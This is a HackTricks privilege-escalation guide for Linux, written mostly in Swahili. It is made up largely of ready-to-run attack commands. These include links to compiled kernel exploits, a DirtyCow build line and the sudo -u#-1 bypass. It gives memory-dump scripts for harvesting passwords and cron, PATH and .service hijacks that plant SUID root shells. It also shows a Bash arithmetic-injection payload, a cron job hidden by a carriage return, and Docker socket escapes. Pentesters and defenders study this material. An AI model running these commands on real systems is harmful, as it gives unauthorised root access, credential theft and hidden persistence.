# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata maarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa una **ruhusa za kuandika kwenye saraka yoyote ndani ya `PATH`**, huenda ukaweza hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Taarifa za Env

Je, kuna taarifa za kuvutia, nywila au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia toleo la kernel na kama kuna exploit yoyote ambayo inaweza kutumika ku-escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zilizo dhaifu na baadhi ya **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yaliyo dhaifu kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana zinazoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Daima **tafuta kernel version kwenye Google**, pengine kernel version yako imeandikwa katika kernel exploit fulani na utakuwa na uhakika kwamba exploit hiyo ni halali.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Toleo la Sudo

Kulingana na matoleo ya sudo yenye udhaifu yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: ukaguzi wa saini ulishindwa

Angalia **smasher2 box of HTB** kwa **mfano** jinsi vuln hii ingeweza kutumiwa.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Zaidi ya system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya docker container unaweza kujaribu kutoroka kutoka ndani yake:

{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **what is mounted and unmounted**, wapi na kwa nini. Ikiwa kitu chochote kimekuwa unmounted, unaweza kujaribu kukimount na kuangalia taarifa za kibinafsi
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia kama **any compiler is installed**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit, kwani inapendekezwa ku-compile katika mashine utakayoitumia (au katika ile inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Zilizowekwa

Chunguza **toleo la vifurushi na huduma zilizowekwa**. Labda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumika kuinua ruhusa…\
Inashauriwa kukagua kwa mkono toleo la programu zinazo shukiwa zaidi zilizowekwa.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwa mashine unaweza pia kutumia **openVAS** kuangalia programu zisizosasishwa na zilizo hatarini zilizosakinishwa kwenye mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa kawaida hazitakuwa na faida; kwa hiyo inashauriwa kutumia programu kama OpenVAS au nyingine zilizo sawa ambazo zitakagua ikiwa toleo lolote la programu lililosakinishwa linaloweza kuathiriwa na exploits zilizojulikana_

## Michakato

Tazama **ni michakato gani** inaendeshwa na angalia kama mchakato wowote una **idhinisho zaidi kuliko inavyostahili** (labda tomcat inaendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Pia **angalia ruhusa zako juu ya binaries za mchakato**, labda unaweza ku-overwrite faili ya mtu mwingine.

### Ufuatiliaji wa mchakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa muhimu sana kutambua michakato iliyo dhaifu inayotekelezwa mara kwa mara au wakati vigezo fulani vinapotimizwa.

### Kumbukumbu ya mchakato

Baadhi ya huduma za server huhifadhi **credentials kwa maandishi wazi ndani ya kumbukumbu**.\
Kawaida utahitaji **root privileges** kusoma kumbukumbu za michakato zinazomilikiwa na watumiaji wengine, kwa hivyo hii kwa kawaida inakuwa muhimu zaidi wakati tayari uko root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu za michakato unazomiliki**.

> [!WARNING]
> Kumbuka kwamba siku hizi mashine nyingi **haziruhusu ptrace kwa default** ambacho kinamaanisha huwezi kufanya dump ya michakato mingine inayomilikiwa na mtumiaji wako asiye na ruhusa za juu.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: michakato yote inaweza kudebugged, mradi tu zinauid sawa. Huu ni utaratibu wa jadi wa jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: mchakato mzazi pekee unaweza kudebugged.
> - **kernel.yama.ptrace_scope = 2**: Msimamizi (admin) peke yake anaweza kutumia ptrace, kwani inahitaji uwezo wa CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna michakato inayoweza kufuatiliwa kwa ptrace. Mara imewekwa, reboot inahitajika ili kuwezesha ptracing tena.

#### GDB

Ikiwa una ufikiaji wa kumbukumbu za huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skripti
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa kitambulisho kilichotolewa cha mchakato (PID), **maps yanaonyesha jinsi kumbukumbu (memory) imepangwa ndani ya virtual address space ya mchakato huo**; pia yanaonyesha **permissions za kila eneo lililowekwa**. Faili pseudo ya **mem** **inaonyesha kumbukumbu ya mchakato yenyewe**. Kutoka kwa faili ya **maps** tunajua ni **eneo gani za kumbukumbu zinazoweza kusomwa** na ofseti zao. Tunatumia taarifa hizi ku-**seek** ndani ya faili ya **mem** na **dump** maeneo yote yanayosomwa kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji kwa kumbukumbu ya mfumo ya **kimwili**, si kumbukumbu ya virtual. Eneo la anwani la kernel la virtual linaweza kufikiwa kwa kutumia /dev/kmem.\
Kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kikundi cha **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump ni toleo la Linux lililofikiriwa upya la zana ya klasiki ProcDump kutoka kwenye suite ya zana za Sysinternals kwa Windows. Pata katika [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

Ili dump process memory unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kwa mkono kuondoa mahitaji ya root na dump process inayomilikiwa na wewe
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Nyaraka za kuingia kutoka kwenye Process Memory

#### Mfano kwa mkono

Ikiwa utagundua kuwa authenticator process inaendeshwa:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza kupiga dump mchakato (angalia sehemu za awali ili kupata njia tofauti za kupiga dump kumbukumbu za mchakato) na kutafuta nyaraka za kuingia ndani ya kumbukumbu:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) itapora **nywila za maandishi wazi kutoka kwenye kumbukumbu** na kutoka kwa baadhi ya **faili zinazojulikana**. Inahitaji ruhusa za root ili ifanye kazi ipasavyo.

| Sifa                                           | Jina la Mchakato         |
| ------------------------------------------------- | -------------------- |
| Nenosiri la GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Muunganisho hai za FTP)                   | vsftpd               |
| Apache2 (Vikao vya HTTP Basic Auth vinavyofanya kazi)         | apache2              |
| OpenSSH (Vikao hai za SSH - Matumizi ya sudo)        | sshd:                |

#### Regex za Utafutaji/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Iliyopangwa/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Ikiwa paneli ya wavuti “Crontab UI” (alseambusher/crontab-ui) inayoendesha kama root na imefungwa kwa loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda privileged job ili kupandisha hadhi.

Typical chain
- Gundua porti iliyo kwenye loopback pekee (e.g., 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Pata credentials katika operational artifacts:
- Backups/scripts na `zip -P <password>`
- systemd unit inayofichua `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Fungua tunnel na ingia:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Tengeneza job yenye ruhusa za juu na iendeshe mara moja (inatoa SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Tumia:
```bash
/tmp/rootshell -p   # root shell
```
Kuimarisha
- Usiruhusu Crontab UI iendeshe kama root; itenge kwa mtumiaji maalum na ruhusa ndogo
- Unganisha kwa localhost na kwa ziada zuia upatikanaji kwa firewall/VPN; usitumie tena nywila
- Epuka kuweka secrets ndani ya unit files; tumia secret stores au EnvironmentFile inayotumika kwa root pekee
- Wezesha audit/logging kwa utekelezaji wa kazi za on-demand

Angalia kama kazi yoyote iliyopangwa ina udhaifu. Labda unaweza kuchukua faida ya script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha files ambazo root anazitumia? tumia symlinks? tengeneza faili maalum katika directory ambayo root anaitumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### PATH ya Cron

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi mtumiaji "user" ana vibali vya kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii mtumiaji root anajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi, unaweza kupata shell ya root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron kutumia script yenye wildcard (Wildcard Injection)

Ikiwa script inayotekelezwa na root ina “**\***” ndani ya amri, unaweza kuitumia kufanya mambo yasiyotegemewa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imeambatanishwa na njia kama** _**/some/path/\***_ **, haitakuwa hatarini (hata** _**./\***_ **si hatari).**

Soma ukurasa ufuatao kwa mbinu zaidi za kutumia wildcard:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa cron/parser ya root inasoma field za log zisizotegemewa na kuziingiza kwenye arithmetic context, mshambuliaji anaweza kuingiza command substitution $(...) ambayo itaendeshwa kama root wakati cron inafanya kazi.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Weka maandishi yanayodhibitiwa na mshambuliaji katika log inayochunguzwa, ili field inayofanana na namba iwe na command substitution na mwisho wake uwe tarakimu. Hakikisha amri yako haisidia kuandika chochote kwenye stdout (au uirekebishe/redirect) ili arithmetic iwe halali.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Iwapo script inayotekelezwa na root inatumia **directory ambapo una upatikanaji kamili**, labda inaweza kuwa ya msaada kufuta folder hiyo na **kuunda symlink folder kuelekea nyingine** inayohudumia script inayodhibitiwa na wewe
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron jobs za mara kwa mara

Unaweza kufuatilia michakato kutafuta zile zinazotekelezwa kila dakika 1, 2 au 5. Huenda ukaweza kuchukua fursa yake na escalate privileges.

Kwa mfano, ili **kufuatilia kila 0.1s kwa muda wa dakika 1**, **kupanga kwa amri zenye utekelezaji mdogo** na kufuta amri zilizotekelezwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila mchakato unaoanza).

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob kwa **kuweka carriage return baada ya comment** (bila newline character), na cronjob itaenda kazi. Mfano (zingatia carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Mafaili yanayoweza kuandikwa _.service_

Angalia kama unaweza kuandika faili yoyote ya `.service`; ikiwa unaweza, unaweza **kuibadilisha** ili i **itekeleze** backdoor yako wakati huduma inapo **anzishwa**, **izinduliwa upya** au **isimamishwe** (labda utahitaji kusubiri hadi mashine ianze upya).\

Kwa mfano, tengeneza backdoor yako ndani ya faili ya .service kwa **`ExecStart=/tmp/script.sh`**

### Binary za huduma zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **idhini ya kuandika juu ya binaries zinazotekelezwa na huduma**, unaweza kuzibadilisha ili kuweka backdoor; hivyo, huduma zitakaporudi kutekelezwa backdoor zitatumika.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** kwa:
```bash
systemctl show-environment
```
Iwapo utagundua kwamba unaweza **write** katika yoyote ya folda za njia hiyo, huenda ukaweza **escalate privileges**. Unahitaji kutafuta **relative paths being used on service configurations** faili kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **executable** yenye **jina sawa na relative path binary** ndani ya systemd PATH folder ambayo unaweza kuandika, na wakati service itakapoulizwa kutekeleza kitendo dhaifu (**Start**, **Stop**, **Reload**), **backdoor** yako itaendeshwa (watumiaji wasio na ruhusa kawaida hawawezi kuanza/kuacha services lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo majina yao yanamalizika na `**.timer**` ambazo zinadhibiti faili au matukio ya `**.service**`. **Timers** zinaweza kutumika kama mbadala wa cron kwani zina msaada uliojengwa kwa ajili ya matukio ya kalenda na matukio ya monotonic na zinaweza kuendeshwa kwa asynchronous.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya units zilizopo za systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma ni nini Unit:

> Unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Kwa hiyo, ili kutekeza ruhusa hii utahitaji:

- Tafuta systemd unit fulani (kama `.service`) ambayo **inayoendesha binary inayoweza kuandikwa**
- Tafuta systemd unit fulani ambayo **inayoendesha relative path** na una **writable privileges** juu ya **systemd PATH** (ili kujifanya executable hiyo)

**Jifunze zaidi kuhusu timers kwa kutumia `man systemd.timer`.**

### **Kuwawezesha Timer**

Ili kuwezesha timer unahitaji ruhusa za root na kuendesha:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) huwezesha **process communication** on the same or different machines within client-server models. Zinatumia standard Unix descriptor files kwa inter-computer communication na zinaanzishwa kupitia `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Inapokea hoja ya boolean. Ikiwa **true**, **service instance is spawned for each incoming connection** na only the connection socket is passed to it. Ikiwa **false**, all listening sockets themselves are **passed to the started service unit**, na only one service unit is spawned for all connections. Thamani hii haizingatiwi kwa datagram sockets na FIFOs ambapo single service unit unconditionally handles all incoming traffic. **Defaults to false**. Kwa sababu za utendaji, inashauriwa kuandika daemons mpya only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Inapokea moja au zaidi command lines, ambazo zina **executed before** au **after** the listening **sockets**/FIFOs are **created** na bound, mtawalia. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** ambazo zina **executed before** au **after** the listening **sockets**/FIFOs are **closed** na removed, mtawalia.
- `Service`: Inabainisha jina la **service** unit **to activate** on **incoming traffic**. Hii setting inaruhusiwa tu kwa sockets with Accept=no. Inategemea kwa default service that bears the same name as the socket (with the suffix replaced). Katika most cases, haitapaswi kuwa lazima kutumia chaguo hili.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho wa ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Mfano wa exploitation:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kuwa kunaweza kuwa na baadhi ya **sockets listening for HTTP requests** (_sina kuzungumzia .socket files, bali faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ikiwa socket **inajibu kwa ombi la HTTP**, basi unaweza **kuwasiliana** nayo na labda **exploit some vulnerability**.

### Docker Socket Inayoweza Kuandikwa

Socket ya Docker, mara nyingi inapatikana katika `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji `root` na wanachama wa kundi la `docker`. Kuwa na ruhusa ya kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hii inaweza kufanywa na mbinu mbadala ikiwa Docker CLI haitapatikana.

#### **Privilege Escalation with Docker CLI**

Ikiwa una ruhusa ya kuandika kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hizi amri zinakuwezesha kuendesha container kwa ufikiaji wa root kwenye filesystem ya host.

#### **Kutumia Docker API moja kwa moja**

Katika kesi ambapo Docker CLI haipatikani, docker socket bado inaweza kudhibitiwa kwa kutumia Docker API na amri za `curl`.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.

### Others

Kumbuka kwamba ikiwa una ruhusa za kuandika kwenye docker socket kwa sababu uko **ndani ya group `docker`** una [**njia zaidi za kuongeza hadhi**](interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API inasikiliza kwenye port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **njia zaidi za kutoroka kutoka docker au kuitumia vibaya ili kuongeza hadhi** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ikiwa unagundua kwamba unaweza kutumia amri ya **`ctr`**, soma ukurasa ufuatao kwa sababu **huenda ukaweza kuitumia vibaya ili kuongeza hadhi**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ikiwa unagundua kwamba unaweza kutumia amri ya **`runc`**, soma ukurasa ufuatao kwa sababu **huenda ukaweza kuitumia vibaya ili kuongeza hadhi**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo wa hali ya juu wa **mawasiliano kati ya michakato (IPC)** unaowezesha programu kuwasiliana kwa ufanisi na kushiriki data. Umeundwa kwa kuzingatia mfumo wa kisasa wa Linux, hutoa mfumo thabiti kwa njia mbalimbali za mawasiliano ya programu.

Mfumo ni wenye mabadilika, unaounga mkono IPC za msingi zinazoimarisha kubadilishana data kati ya michakato, similari na **sockets za eneo la UNIX zilizoimarishwa**. Zaidi ya hayo, husaidia katika kutangaza matukio au ishara, kukuza ushirikiano wa sehemu za mfumo. Kwa mfano, ishara kutoka kwa daemon ya Bluetooth kuhusu simu inayokuja inaweza kusababisha player wa muziki kutulia, kuboresha uzoefu wa mtumiaji. Aidha, D-Bus inaunga mkono mfumo wa vitu vya mbali (remote object system), kurahisisha maombi ya huduma na kuitishwa kwa method kati ya programu, kurahisisha michakato ambayo kwa kawaida ilikuwa ngumu.

